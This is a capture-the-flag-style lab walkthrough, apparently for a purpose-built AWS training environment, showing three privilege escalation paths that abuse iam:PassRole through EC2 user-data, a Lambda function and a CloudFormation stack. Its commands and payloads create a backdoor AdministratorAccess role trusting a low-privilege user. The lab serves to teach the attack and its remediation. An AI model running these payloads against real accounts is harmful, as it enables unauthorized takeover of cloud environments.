# Guided Walkthrough: Prod Role with Multiple Privilege Escalation Paths

This scenario demonstrates a privilege escalation pattern where a single role holds `iam:PassRole` combined with the ability to launch compute resources. When those resources can be configured with an admin IAM role, the attacker effectively delegates their payload to run under `AdministratorAccess` -- without directly holding admin permissions themselves. The role is the gun; `iam:PassRole` is the trigger.

What makes this scenario particularly instructive is the redundancy: three entirely independent escalation paths exist side by side. You can reach the same outcome via EC2, Lambda, or CloudFormation. Real environments often accumulate these combinations gradually -- a team needs to deploy Lambda functions with a service role here, run CloudFormation stacks with elevated permissions there -- and no individual grant looks alarming in isolation. The danger is the combination.

When a role with `iam:PassRole` can also create compute resources, it can externalize arbitrary code execution under any role it can pass. The compute service becomes a proxy for IAM operations the attacker cannot perform directly.

## The Challenge

You have obtained credentials for `pl-pathfinding-starting-user-prod`, a low-privilege IAM user. Your goal is full administrative access to the AWS account.

Your starting user can assume exactly one role: `pl-prod-role-with-multiple-privesc-paths`. That role holds `iam:PassRole` and compute service creation permissions, and three service admin roles exist in the account -- one each for EC2, Lambda, and CloudFormation -- each carrying `AdministratorAccess`.

Any one of those three paths gets you there. You only need to succeed with one.

Start by confirming your identity and that you have no direct admin access:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
# You should see: pl-pathfinding-starting-user-prod

aws iam list-users --max-items 1
# AccessDenied -- good, no admin access yet
```

## Reconnaissance

With `iam:ListRoles` available, discover what roles exist in the account:

```bash
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
```

You'll spot several interesting roles: `pl-prod-role-with-multiple-privesc-paths`, `pl-prod-ec2-admin-role`, `pl-prod-lambda-admin-role`, and `pl-prod-cloudformation-admin-role`. Check the trust policy of the escalation role to confirm your starting user can assume it:

```bash
aws iam get-role --role-name pl-prod-role-with-multiple-privesc-paths \
  --query 'Role.AssumeRolePolicyDocument'
```

You'll see your starting user ARN listed as a trusted principal. Now look at the policies attached to that role:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-role-with-multiple-privesc-paths
aws iam list-role-policies \
  --role-name pl-prod-role-with-multiple-privesc-paths
```

The policy will show `iam:PassRole`, `ec2:RunInstances`, `lambda:CreateFunction`, and `cloudformation:CreateStack`. You can also check the service admin roles' trust policies to confirm each one trusts its respective compute service:

```bash
aws iam get-role --role-name pl-prod-ec2-admin-role \
  --query 'Role.AssumeRolePolicyDocument'
# Trust: ec2.amazonaws.com

aws iam get-role --role-name pl-prod-lambda-admin-role \
  --query 'Role.AssumeRolePolicyDocument'
# Trust: lambda.amazonaws.com
```

You now have a clear picture of the environment. Time to escalate.

## Exploitation

### Hop 1: Assume the Escalation Role

First, move from your starting user into the role that has the dangerous permissions:

```bash
ROLE_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-role-with-multiple-privesc-paths" \
  --role-session-name "multiple-privesc-demo")

export AWS_ACCESS_KEY_ID=$(echo "$ROLE_CREDS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ROLE_CREDS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ROLE_CREDS" | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
# You should see: pl-prod-role-with-multiple-privesc-paths
```

You are now operating as the escalation role. Choose any of the three paths below.

### Hop 2a: EC2 Path -- Launch Instance with Admin Role

The EC2 path works by launching an instance with `pl-prod-ec2-admin-role` attached as the instance profile. EC2 instances can access their role credentials via the Instance Metadata Service, and any code running on the instance -- including user-data scripts that run at boot -- has those credentials automatically. Your payload runs as root at instance creation time.

Create a user-data script that provisions a new admin role:

```bash
cat > /tmp/payload.sh << PAYLOAD
#!/bin/bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
aws iam create-role \
  --role-name privesc-demo-ec2-admin-role \
  --assume-role-policy-document "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [{
      \"Effect\": \"Allow\",
      \"Principal\": {\"AWS\": \"arn:aws:iam::\${ACCOUNT_ID}:user/pl-pathfinding-starting-user-prod\"},
      \"Action\": \"sts:AssumeRole\"
    }]
  }"
aws iam attach-role-policy \
  --role-name privesc-demo-ec2-admin-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
PAYLOAD
```

Now launch the instance:

```bash
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
  --output text --region us-west-2)

aws ec2 run-instances \
  --region us-west-2 \
  --image-id "$AMI_ID" \
  --instance-type t3.micro \
  --iam-instance-profile Name=pl-EC2Admin \
  --user-data file:///tmp/payload.sh \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2}]'
```

The instance takes a couple of minutes to boot and run its user-data. Wait and then jump to Verification.

### Hop 2b: Lambda Path -- Create Function with Admin Role

The Lambda path is faster than EC2. You create a function using `pl-prod-lambda-admin-role` as its execution role, then invoke it immediately. The function code runs with full `AdministratorAccess`.

Write a Python payload that creates a new admin role:

```python
# payload.py
import boto3, json

def handler(event, context):
    account_id = context.invoked_function_arn.split(':')[4]
    iam = boto3.client('iam')
    iam.create_role(
        RoleName='privesc-demo-lambda-admin-role',
        AssumeRolePolicyDocument=json.dumps({
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{account_id}:user/pl-pathfinding-starting-user-prod"},
                "Action": "sts:AssumeRole"
            }]
        })
    )
    iam.attach_role_policy(
        RoleName='privesc-demo-lambda-admin-role',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'statusCode': 200, 'body': 'Done'}
```

Package and deploy it:

```bash
cd /tmp && zip payload.zip payload.py

aws lambda create-function \
  --function-name privesc-demo-lambda \
  --runtime python3.9 \
  --role "arn:aws:iam::{account_id}:role/pl-prod-lambda-admin-role" \
  --handler payload.handler \
  --zip-file fileb:///tmp/payload.zip \
  --region us-west-2

# Wait for the function to be active, then invoke it
aws lambda wait function-active \
  --function-name privesc-demo-lambda --region us-west-2

aws lambda invoke \
  --function-name privesc-demo-lambda \
  --region us-west-2 \
  /tmp/lambda-response.json

cat /tmp/lambda-response.json
```

A 200 response means the payload ran successfully and the new admin role exists.

### Hop 2c: CloudFormation Path -- Deploy Stack with Admin Role

The CloudFormation path passes `pl-prod-cloudformation-admin-role` to a stack using `--role-arn`. CloudFormation then uses that role to provision all resources in the template -- including IAM roles, thanks to `CAPABILITY_NAMED_IAM`.

Write a minimal template:

```bash
cat > /tmp/template.yaml << 'TMPL'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  PrivescDemoRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: privesc-demo-cf-admin-role
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:user/pl-pathfinding-starting-user-prod'
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
TMPL

aws cloudformation create-stack \
  --stack-name privesc-demo-cf-stack \
  --template-body file:///tmp/template.yaml \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-admin-role" \
  --capabilities CAPABILITY_NAMED_IAM \
  --region us-west-2

aws cloudformation wait stack-create-complete \
  --stack-name privesc-demo-cf-stack --region us-west-2
```

Once the stack reaches `CREATE_COMPLETE`, the role is ready.

## Verification

Switch back to your starting user credentials and assume the newly created admin role (adjust the role name based on which path you used):

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

# For the EC2 path:
ADMIN_ROLE_NAME="privesc-demo-ec2-admin-role"
# For the Lambda path:
# ADMIN_ROLE_NAME="privesc-demo-lambda-admin-role"
# For the CloudFormation path:
# ADMIN_ROLE_NAME="privesc-demo-cf-admin-role"

ADMIN_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/$ADMIN_ROLE_NAME" \
  --role-session-name "verify-admin")

export AWS_ACCESS_KEY_ID=$(echo "$ADMIN_CREDS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ADMIN_CREDS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ADMIN_CREDS" | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
aws iam list-users --max-items 5 --output table
```

If `iam:ListUsers` returns results, you have administrator access. The escalation is complete.

## What Happened

You started with a low-privilege user that could only assume one role. That role held `iam:PassRole` -- the ability to hand a role's permissions to an AWS service -- combined with permissions to create EC2 instances, Lambda functions, and CloudFormation stacks. You used one of those compute services as a proxy: it ran code under `AdministratorAccess` and used those admin credentials to create a new IAM role that trusts your starting identity.

The key insight is that `iam:PassRole` combined with any compute creation permission is effectively equivalent to having whatever the passable role can do. You never directly called an IAM write API from your own credentials -- the compute service did it for you.

What makes this pattern especially dangerous in real environments is the redundancy. Organizations often remediate one path (removing `ec2:RunInstances`, for instance) without auditing for the others. All three `PassRole` + compute creation combinations must be addressed simultaneously, and the only durable fix is to remove `iam:PassRole` from any role that also holds compute service creation permissions, or to constrain `iam:PassRole` to specific approved role ARNs rather than allowing `*`.
